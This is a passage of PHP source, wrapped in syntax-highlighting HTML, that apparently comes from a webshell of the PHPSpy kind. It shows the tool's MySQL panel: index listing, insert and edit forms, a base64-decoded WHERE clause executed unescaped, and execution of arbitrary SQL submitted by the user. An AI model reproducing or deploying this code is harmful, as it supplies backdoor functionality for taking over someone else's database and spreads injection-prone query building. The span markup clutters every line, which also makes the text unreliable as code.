<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Index_type'].'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.($row['Non_unique'] ? 'No' : 'Yes').'&amp;nbsp;&lt;/td<span style="text-decoration: underline;">&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.($row['Packed'] === null ? 'No' : $row['Packed'<span style="text-decoration: underline;">]).'&amp;nbsp;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Seq_in_index'].'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Column_name'].($row['Sub_part'] ? '('.$ro<span style="text-decoration: underline;">w['Sub_part'].')' : '').'&amp;nbsp;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.($row['Cardinality'] ? $row['Cardinality'] : 0)<span style="text-decoration: underline;">.'&amp;nbsp;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Collation'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Null'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Comment'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   tbfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif ($doing == 'insert' || $doing == 'edit') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $result = q('SHOW COLUMNS FROM '.$tablename);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while ($row = mysql_fetch_array($result)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $rowdb[] = $row;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $rs = array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($doing == 'insert') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;Insert new line in '.$tablename.' table &amp;raquo;&lt;/<span style="text-decoration: underline;">h2&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;Update record in '.$tablename.' table &amp;raquo;&lt;/h2<span style="text-decoration: underline;">&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $where = base64_decode($base64);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $result = q("SELECT * FROM $tablename WHERE $where LIMIT<span style="text-decoration: underline;"> 1");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $rs = mysql_fetch_array($result);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;form method="post" action="'.$self.'"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p($dbform);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','mysqladmin');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('tablename',$tablename);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($rowdb as $row) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($rs[$row['Field']]) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $value = htmlspecialchars($rs[$row['Field']]);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $value = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $thisbg = bg();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\<span style="text-decoration: underline;">'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_incre<span style="text-decoration: underline;">ment' || $row['Key'] == 'PRI') {</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;&lt;b&gt;'.$row['Field'].'&lt;/b&gt;&lt;br /&gt;'.$row['Type'].<span style="text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;'.$value.'&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {<span style="color: #de935f; background-color: #373b41;">                            </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;&lt;b&gt;'.$row['Field'].'&lt;/b&gt;&lt;br /&gt;'.$row['Type'].<span style="text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;"&gt;'.$value.'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($doing == 'insert') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="'.bg().'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt<span style="text-decoration: underline;">" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="'.bg().'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt<span style="text-decoration: underline;">" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('base64', $base64);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/table&gt;&lt;/form&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $querys = @explode(';',$sql_query);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($querys as $num=&gt;$query) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($query) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;p&gt;&lt;b&gt;Query#{$num} : ".htmlspecialchars($query,EN<span style="text-decoration: underline;">T_QUOTES)."&lt;/b&gt;&lt;/p&gt;");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   switch(qy($query))
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   case 0:
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;Error : '.mysql_error().'&lt;/h2&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   break;<span style="color: #de935f; background-color: #373b41;">  </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   case 1:
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (strtolower(substr($query,0,13)) == 'sele<span style="text-decoration: underline;">ct * from') {</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $allowedit = 1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($getnumsql) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $tatol = mysql_num_rows(q($getnumsql));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $multipage = multi($tatol, $pagenum, $pa<span style="text-decoration: underline;">ge, $tablename);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (!$tablename) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $sql_line = str_replace(array("\r", "\n"<span style="text-decoration: underline;">, "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $sql_line = preg_replace("/\/\*[^(\*\/)]<span style="text-decoration: underline;">*\*\//i", " ", $sql_line);</span>
